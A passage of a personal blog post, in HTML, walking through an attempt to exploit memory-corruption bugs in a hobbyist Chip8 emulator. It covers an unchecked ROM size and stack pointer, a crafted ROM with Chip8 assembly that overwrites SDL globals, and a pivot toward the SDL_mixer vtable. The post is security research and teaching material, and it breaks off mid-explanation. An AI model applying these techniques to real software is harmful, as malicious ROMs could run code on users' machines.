@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>(An Attempt at) Pwning a Chip8 Emulator - Luca's Blog</title>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="/assets/styles/main.css">
+</head>
+
+<body>
+    <div class="container">
+            <div class="headbar">
+                <div class="sitename">
+                    <h1>Luca's Blog</h1>
+                </div>
+                <nav>
+                    <ul class="nav-links">
+                        <li><a href="/" >Home</a></li>
+                        <li><a href="/blog" >Blog</a></li>
+                    </ul>
+                </nav>
+            </div>
+        
+            <main>
+                <article>
+    <header>
+        <h1 class="post-title">(An Attempt at) Pwning a Chip8 Emulator</h1>
+        <div class="post-author">Author: Luca Bertozzi</div>
+        <div class="post-date">Oct 24, 2024</div>
+        <div class="post-tags">
+            <div>Tags</div>
+            <ul>
+                
+                <li>binary-exploitation</li>
+                
+            </ul>
+        </div>
+    </header>
+    <p>Recently I was browsing the projects section on the Discord server of the <a href="https://discord.gg/c-asm">C-ASM Community</a>
+(which is a great community and you should join) and I found an interesting
+<a href="https://github.com/Docas95/CHIP8-Emulator-C">Chip8 Emulator project</a>. As I was reading through the code and I reached the 
+<code class="language-plaintext highlighter-rouge">load_ROM</code> function I immediately saw a problem</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// load content from ROM into memory</span>
+<span class="kt">void</span> <span class="nf">load_ROM</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+	<span class="kt">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Error opening file!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
+	<span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+	<span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+
+	<span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chip</span><span class="p">.</span><span class="n">memory</span><span class="p">[</span><span class="n">ROM_START_ADDRESS</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+
+	<span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The file size is not checked before its contents are written using <code class="language-plaintext highlighter-rouge">fread</code>!
+Then while thinking how to exploit the above issue I found another interesting problem: in the fuction <code class="language-plaintext highlighter-rouge">decode_instruction</code> the
+decrement of the stack pointer for the return instruction</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>				<span class="k">case</span> <span class="mh">0x00EE</span><span class="p">:</span>
+					<span class="c1">// return from subroutine</span>
+					<span class="n">chip</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">chip</span><span class="p">.</span><span class="n">stack</span><span class="p">[</span><span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+					<span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="o">--</span><span class="p">;</span>				
+				<span class="k">break</span><span class="p">;</span> 
+</code></pre></div></div>
+<p>and the increment of the stack pointer for the call instruction</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">case</span> <span class="mh">0x2000</span><span class="p">:</span>
+			<span class="c1">// call subroutine</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">stack</span><span class="p">[</span><span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="p">]</span> <span class="o">=</span> <span class="n">chip</span><span class="p">.</span><span class="n">pc</span><span class="p">;</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">NNN</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+<p>do not check if the stack will under/over-flow respectively. This can also be used to corrupt memory beyond the limits of the
+<code class="language-plaintext highlighter-rouge">chip.stack</code> array! The question is now: can this be exploited? Can we make a malicious ROM capable of running arbitrary code?</p>
+
+<h1 id="exploitation-attempt">Exploitation Attempt</h1>
+
+<p>For a start let’s try using a position <em>dependent</em> executable by modifying the <code class="language-plaintext highlighter-rouge">makefile</code></p>
+<div class="language-makefile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Makefile for CHIP-8 Emulator Project
+</span>
+<span class="nv">CC</span> <span class="o">=</span> gcc
+<span class="nv">CFLAGS</span> <span class="o">=</span> <span class="nt">-g</span> <span class="nt">-fno-pie</span>
+<span class="nv">OBJS</span> <span class="o">=</span> main.o
+<span class="nv">TARGET</span> <span class="o">=</span> Chip8
+<span class="nv">LIBS</span> <span class="o">=</span> <span class="nt">-lSDL2</span> <span class="nt">-lSDL2_mixer</span>
+
+<span class="nl">$(TARGET)</span><span class="o">:</span> <span class="nf">$(OBJS)</span>
+	<span class="nv">$(CC)</span> <span class="nt">-no-pie</span> <span class="nv">$(OBJS)</span> <span class="nt">-o</span> <span class="nv">$(TARGET)</span> <span class="nv">$(LIBS)</span>
+
+<span class="nl">main.o</span><span class="o">:</span> <span class="nf">main.c main.h</span>
+	<span class="nv">$(CC)</span> <span class="nv">$(CFLAGS)</span> <span class="nt">-c</span> main.c
+<span class="nl">clean</span><span class="o">:</span>
+	<span class="nb">rm</span> <span class="nt">-f</span> <span class="k">*</span>.o <span class="nv">$(TARGET)</span>
+
+<span class="nl">run</span><span class="o">:</span> <span class="nf">$(TARGET)</span>
+	./<span class="nv">$(TARGET)</span>
+</code></pre></div></div>
+
+<p>The overflow bugs allows corrupting the global <code class="language-plaintext highlighter-rouge">struct Chip8</code>, unfortunately the other global variables
+after the said structure</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">Chip8</span> <span class="n">chip</span><span class="p">;</span>
+
+<span class="n">SDL_Window</span><span class="o">*</span> <span class="n">window</span><span class="p">;</span>
+<span class="n">SDL_Renderer</span><span class="o">*</span> <span class="n">renderer</span><span class="p">;</span>
+<span class="n">SDL_Rect</span> <span class="n">square</span><span class="p">;</span>
+<span class="n">Mix_Music</span> <span class="o">*</span><span class="n">sound</span><span class="p">;</span>
+</code></pre></div></div>
+<p>are initialized after the overflow happens in the <code class="language-plaintext highlighter-rouge">init_SDL</code> function so we can’t control them using the overflow.
+However I realized I can overwrite them to arbitrary values using this gadget (which is the code that handles the <code class="language-plaintext highlighter-rouge">call</code> 
+instruction)</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="c1">// call subroutine</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">stack</span><span class="p">[</span><span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="p">]</span> <span class="o">=</span> <span class="n">chip</span><span class="p">.</span><span class="n">pc</span><span class="p">;</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">stack_pointer</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">NNN</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+<p>we can write the value of <code class="language-plaintext highlighter-rouge">chip.pc</code> to an arbitrary offset from <code class="language-plaintext highlighter-rouge">chip.stack</code>. We can control <code class="language-plaintext highlighter-rouge">chip.stack_pointer</code> using the 
+buffer overflow for simplicity, but it should be possible to control it also using the fact that the incrementation of the stack 
+pointer is not checked (so invoking <code class="language-plaintext highlighter-rouge">call</code> the right number of times we can overflow the VM stack and write other memory, this
+is in fact when I realized the second bug).
+Now that I kew I could overwrite global memory after <code class="language-plaintext highlighter-rouge">init_SDL</code> is called I started checking what <code class="language-plaintext highlighter-rouge">SDL_Renderer</code> looks like:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">SDL_Renderer</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">WindowEvent</span><span class="p">)(</span><span class="n">SDL_Renderer</span> <span class="o">*</span><span class="n">renderer</span><span class="p">,</span> <span class="k">const</span> <span class="n">SDL_WindowEvent</span> <span class="o">*</span><span class="n">event</span><span class="p">);</span>
+    <span class="n">bool</span> <span class="p">(</span><span class="o">*</span><span class="n">GetOutputSize</span><span class="p">)(</span><span class="n">SDL_Renderer</span> <span class="o">*</span><span class="n">renderer</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">w</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">h</span><span class="p">);</span>
+    <span class="n">bool</span> <span class="p">(</span><span class="o">*</span><span class="n">SupportsBlendMode</span><span class="p">)(</span><span class="n">SDL_Renderer</span> <span class="o">*</span><span class="n">renderer</span><span class="p">,</span> <span class="n">SDL_BlendMode</span> <span class="n">blendMode</span><span class="p">);</span>
+    <span class="n">bool</span> <span class="p">(</span><span class="o">*</span><span class="n">CreateTexture</span><span class="p">)(</span><span class="n">SDL_Renderer</span> <span class="o">*</span><span class="n">renderer</span><span class="p">,</span> <span class="n">SDL_Texture</span> <span class="o">*</span><span class="n">texture</span><span class="p">,</span> <span class="n">SDL_PropertiesID</span> <span class="n">create_props</span><span class="p">);</span>
+    <span class="n">bool</span> <span class="p">(</span><span class="o">*</span><span class="n">QueueSetViewport</span><span class="p">)(</span><span class="n">SDL_Renderer</span> <span class="o">*</span><span class="n">renderer</span><span class="p">,</span> <span class="n">SDL_RenderCommand</span> <span class="o">*</span><span class="n">cmd</span><span class="p">);</span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>As I saw this I thought JACKPOT. There is what looks like a huge vtable which is great to control code execution. So at this
+point the plan was using the above primitive to make the global <code class="language-plaintext highlighter-rouge">renderer</code> pointer point to a memory region I control, where
+I would place a forged <code class="language-plaintext highlighter-rouge">SDL_Renderer</code> structure.</p>
+
+<h2 id="writing-arbitrary-values-using-the-write-primitive">Writing arbitrary values using the write primitive</h2>
+<p>Let me focus on how exactly the overwriting of the <code class="language-plaintext highlighter-rouge">renderer</code> pointer works. The objective here is overwriting it with
+the value <code class="language-plaintext highlighter-rouge">0x406a5e</code> which points somewhere after the global variables in an area I control via the overflow. Notice that the 
+primitive allows to write 16 bits integers and we need to use it twice to first write the value <code class="language-plaintext highlighter-rouge">0x6a5e</code> in the low bits and then
+<code class="language-plaintext highlighter-rouge">0x0040</code> in the high bits (the other 32 bits seem to be zeroed always).
+Let us take a look at <code class="language-plaintext highlighter-rouge">struct Chip8</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">Chip8</span><span class="p">{</span>
+        <span class="kt">uint8_t</span> <span class="n">memory</span><span class="p">[</span><span class="n">MEM_SIZE</span><span class="p">];</span>
+	<span class="kt">uint8_t</span> <span class="n">display</span><span class="p">[</span><span class="n">ROWS</span> <span class="o">*</span> <span class="n">COLUMNS</span><span class="p">];</span>
+	<span class="kt">uint16_t</span> <span class="n">pc</span><span class="p">;</span>
+	<span class="kt">uint16_t</span> <span class="n">index</span><span class="p">;</span> 
+	<span class="kt">uint16_t</span> <span class="n">stack</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+	<span class="kt">uint8_t</span> <span class="n">stack_pointer</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">delay</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">sound</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">registers</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+	<span class="kt">uint16_t</span> <span class="n">op_code</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">draw_flag</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">draw_wait</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">input</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="p">};</span>
+
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">MEM_SIZE</code> here is <code class="language-plaintext highlighter-rouge">0x1000</code>, during normal execution the program counter is supposed to be in the inclusive bounds <code class="language-plaintext highlighter-rouge">0x-0xfff</code>,
+but we need to write the value <code class="language-plaintext highlighter-rouge">0x6a5e</code> which is clearly beyond the bounds (recall the primitive writes <code class="language-plaintext highlighter-rouge">chip.pc</code>).
+The places where <code class="language-plaintext highlighter-rouge">chip.pc</code> is updated take its bounds into consideration: for example the code for the <code class="language-plaintext highlighter-rouge">jump</code> instruction is</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">case</span> <span class="mh">0x1000</span><span class="p">:</span>
+			<span class="c1">// jump</span>
+			<span class="n">chip</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">NNN</span><span class="p">;</span>			
+			<span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+<p>and <code class="language-plaintext highlighter-rouge">NNN</code> is correctly bounded <code class="language-plaintext highlighter-rouge">uint16_t NNN = 0x0FFF &amp; chip.op_code;</code>. One place where <code class="language-plaintext highlighter-rouge">chip.pc</code> bounds are not checked is in
+the <code class="language-plaintext highlighter-rouge">fetch_instruction</code> function</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">fetch_instruction</span><span class="p">(){</span>
+	<span class="n">chip</span><span class="p">.</span><span class="n">op_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">chip</span><span class="p">.</span><span class="n">op_code</span> <span class="o">=</span> <span class="n">chip</span><span class="p">.</span><span class="n">memory</span><span class="p">[</span><span class="n">chip</span><span class="p">.</span><span class="n">pc</span> <span class="o">%</span> <span class="n">MEM_SIZE</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span> <span class="n">chip</span><span class="p">.</span><span class="n">memory</span><span class="p">[(</span><span class="n">chip</span><span class="p">.</span><span class="n">pc</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">MEM_SIZE</span><span class="p">];</span>
+	<span class="n">chip</span><span class="p">.</span><span class="n">pc</span><span class="o">+=</span><span class="mi">2</span><span class="p">;</span>	
+<span class="p">}</span>
+</code></pre></div></div>
+<p>However using this to increment <code class="language-plaintext highlighter-rouge">chip.pc</code> to <code class="language-plaintext highlighter-rouge">0x6a5e</code> is not possible as somewhere in the code we need to have a call instruction
+to trigger the write and this will reset PC into the correct range, while incrementing it to the target value would require 
+executing all memory multiple times without resetting PC to the correct range while doing so.
+However what we can do is use the overflow to set PC to <code class="language-plaintext highlighter-rouge">0x6a5c</code> at the beginning of the execution, the corresponding instruction
+fetched will be at the VM address <code class="language-plaintext highlighter-rouge">0xa5c</code> (note that PC points already to the next instruction when the <code class="language-plaintext highlighter-rouge">call</code> handling code
+is executed, thus we need to set it to what we want to write minus 2).</p>
+
+<p>The second value we have to write is <code class="language-plaintext highlighter-rouge">0x0040</code>, luckily this is in the valid range, however the ROM is loaded starting from address
+<code class="language-plaintext highlighter-rouge">0x200</code>. To add the <code class="language-plaintext highlighter-rouge">call</code> code (which triggers the gadget) at address <code class="language-plaintext highlighter-rouge">0x040</code> we need to use some Chip8 instructions.</p>
+
+<p>The final assembly looks like this (honestly I do not know if there are standard mnemonics for Chip8 instructions, so
+I invented them).</p>
+
+<p>At address <code class="language-plaintext highlighter-rouge">0xa5c</code>, where execution begins due to the overwritten PC, we have</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CALL 0x200
+</code></pre></div></div>
+<p>which writes the value <code class="language-plaintext highlighter-rouge">0x6a5e</code> at the offset from <code class="language-plaintext highlighter-rouge">chip.stack</code> we control by controlling the stack pointer.
+The call moves to address <code class="language-plaintext highlighter-rouge">0x200</code> where we have</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MOV V0, 0x22 ; store 0x22 into register V0
+MOV V1, 0x22 ; store 0x22 into register V1
+SETIDX 0x3e  ; set index to 0x3e
+STORE 1      ; store registers V0 and V1 at index [0x3e] = V0, [0x3f] = V1
+             ; notice that 0x2222 is the opcode for CALL 0x222
+			 ; i chose this to avoid confusing myself with endianness
+JUMP 0x3e    ; jump at 0x3e triggering the write
+</code></pre></div></div>
+<p>Again <code class="language-plaintext highlighter-rouge">0x3e</code> is what we want to write minus 2. Notice that the stack pointer is incremented by call itself so we are already 
+writing in the right memory location. Now what will be executed next depends on what we put at address <code class="language-plaintext highlighter-rouge">0x222</code>, but we will discuss this later.</p>
+
+<h1 id="arbitrary-call-primitive">Arbitrary call primitive</h1>
+<p>Now that we control the <code class="language-plaintext highlighter-rouge">renderer</code> pointer we should be able to use its vtable to get an arbitrary call primitive pretty easily, 
+right?
+Well, unfortunately the <code class="language-plaintext highlighter-rouge">SDL2</code> pointers are validated against a global hash table and unless we control also that hash table, the 
+vtable functions will never be called</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">SDL_ObjectValid</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">object</span><span class="p">,</span> <span class="n">SDL_ObjectType</span> <span class="n">type</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">object</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">object_type</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SDL_FindInHashTable</span><span class="p">(</span><span class="n">SDL_objects</span><span class="p">,</span> <span class="n">object</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">object_type</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="p">(((</span><span class="n">SDL_ObjectType</span><span class="p">)(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">object_type</span><span class="p">)</span> <span class="o">==</span> <span class="n">type</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This seems more of a dynamic type check rather than a security mechanism, but it makes the exploitation more complicated too.
+OUCH!</p>
+
+<p>However there still is <code class="language-plaintext highlighter-rouge">Mix_Music *sound;</code> which comes from a different library also by SDL called <code class="language-plaintext highlighter-rouge">SDL_mixer</code>. I thought maybe
+they will still use vtables here, but due to this being a newer library maybe this kind of checks are not there. And indeed</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">Mix_Music</span> <span class="p">{</span>
+    <span class="n">Mix_MusicInterface</span> <span class="o">*</span><span class="n">interface</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">context</span><span class="p">;</span>
+
+    <span class="n">bool</span> <span class="n">playing</span><span class="p">;</span>
+    <span class="n">Mix_Fading</span> <span class="n">fading</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fade_step</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fade_steps</span><span class="p">;</span>
+
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">Mix_MusicInterface</code> type sound like a vtable and in fact</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tag</span><span class="p">;</span>
+    <span class="n">Mix_MusicAPI</span> <span class="n">api</span><span class="p">;</span>
+    <span class="n">Mix_MusicType</span> <span class="n">type</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">loaded</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">opened</span><span class="p">;</span>
+
+    <span class="cm">/* Load the library */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">Load</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
+
+    <span class="cm">/* Initialize for the audio output */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">Open</span><span class="p">)(</span><span class="k">const</span> <span class="n">SDL_AudioSpec</span> <span class="o">*</span><span class="n">spec</span><span class="p">);</span>
+
+    <span class="cm">/* Create a music object from an SDL_IOStream stream
+     * If the function returns NULL, 'src' will be freed if needed by the caller.
+     */</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">CreateFromIO</span><span class="p">)(</span><span class="n">SDL_IOStream</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="n">bool</span> <span class="n">closeio</span><span class="p">);</span>
+
+    <span class="cm">/* Create a music object from a file, if SDL_IOStream are not supported */</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">CreateFromFile</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">);</span>
+
+    <span class="cm">/* Set the volume */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">SetVolume</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">volume</span><span class="p">);</span>
+
+    <span class="cm">/* Get the volume */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">GetVolume</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Start playing music from the beginning with an optional loop count */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">Play</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">play_count</span><span class="p">);</span>
+
+    <span class="cm">/* Returns true if music is still playing */</span>
+    <span class="n">bool</span> <span class="p">(</span><span class="o">*</span><span class="n">IsPlaying</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Get music data, returns the number of bytes left */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">GetAudio</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bytes</span><span class="p">);</span>
+
+    <span class="cm">/* Jump to a given order in mod music */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">Jump</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">order</span><span class="p">);</span>
+
+    <span class="cm">/* Seek to a play position (in seconds) */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">Seek</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">double</span> <span class="n">position</span><span class="p">);</span>
+
+    <span class="cm">/* Tell a play position (in seconds) */</span>
+    <span class="kt">double</span> <span class="p">(</span><span class="o">*</span><span class="n">Tell</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Get Music duration (in seconds) */</span>
+    <span class="kt">double</span> <span class="p">(</span><span class="o">*</span><span class="n">Duration</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Tell a loop start position (in seconds) */</span>
+    <span class="kt">double</span> <span class="p">(</span><span class="o">*</span><span class="n">LoopStart</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Tell a loop end position (in seconds) */</span>
+    <span class="kt">double</span> <span class="p">(</span><span class="o">*</span><span class="n">LoopEnd</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Tell a loop length position (in seconds) */</span>
+    <span class="kt">double</span> <span class="p">(</span><span class="o">*</span><span class="n">LoopLength</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Get a meta-tag string if available */</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">GetMetaTag</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="n">Mix_MusicMetaTag</span> <span class="n">tag_type</span><span class="p">);</span>
+
+    <span class="cm">/* Get number of tracks. Returns -1 if not applicable */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">GetNumTracks</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Start a specific track */</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">StartTrack</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">track</span><span class="p">);</span>
+
+    <span class="cm">/* Pause playing music */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Pause</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Resume playing music */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Resume</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Stop playing music */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Stop</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Delete a music object */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Delete</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">music</span><span class="p">);</span>
+
+    <span class="cm">/* Close the library and clean up */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Close</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
+
+    <span class="cm">/* Unload the library */</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">Unload</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">Mix_MusicInterface</span><span class="p">;</span>
+</code></pre></div></div>
+<p>and the checks are missing too: BINGO!</p>
+
+<p>So what we do with the assembly at <code class="language-plaintext highlighter-rouge">0x222</code>? Well we need to call some of those virtual function. In <code class="language-plaintext highlighter-rouge">main</code> we have</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="c1">// play sound</span>
+		<span class="k">if</span><span class="p">(</span><span class="n">chip</span><span class="p">.</span><span class="n">sound</span><span class="p">){</span>
+			<span class="n">Mix_PlayMusic</span><span class="p">(</span><span class="n">sound</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+<p>and <code class="language-plaintext highlighter-rouge">chip.sound</code> is controlled via a specific instruction (let me call it <code class="language-plaintext highlighter-rouge">SOUND X</code>) which sets <code class="language-plaintext highlighter-rouge">chip.sound</code> to the value of <code class="language-plaintext highlighter-rouge">VX</code>.
+Since we already have some different than zero value in <code class="language-plaintext highlighter-rouge">V0</code> and <code class="language-plaintext highlighter-rouge">V1</code> we can just put the following assembly at<code class="language-plaintext highlighter-rouge">0x222</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SOUND 0
+</code></pre></div></div>
+<p>Now let me explore the SDL2_mixer source code. Here is <code class="language-plaintext highlighter-rouge">Mix_PlayMusic</code></p>
